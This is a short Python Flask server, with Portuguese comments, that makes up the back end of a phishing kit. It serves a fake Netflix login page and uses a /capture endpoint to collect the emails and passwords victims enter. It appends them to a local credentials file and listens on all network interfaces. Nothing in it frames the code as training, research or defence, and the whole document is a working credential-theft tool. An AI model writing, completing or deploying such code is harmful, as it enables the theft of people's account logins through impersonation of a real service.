from flask import Flask, request, jsonify, redirect
import json
import webbrowser
import os

app = Flask(__name__)

# Arquivo para salvar credenciais
LOG_FILE = "netflix_credentials.txt"

@app.route('/')
def serve_fake_page():
    return app.send_static_file('fake-netflix/index.html')

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    email = data.get('email')
    password = data.get('password')

    with open(LOG_FILE, 'a') as f:
        f.write(f"Email: {email} | Senha: {password}\n")

    return jsonify({"status": "success"})

@app.route('/shutdown')
def shutdown():
    os._exit(0)

if __name__ == '__main__':
    # Abrir página falsa no navegador automaticamente
    webbrowser.open("http://localhost:5000")
    app.run(host='0.0.0.0', port=5000)
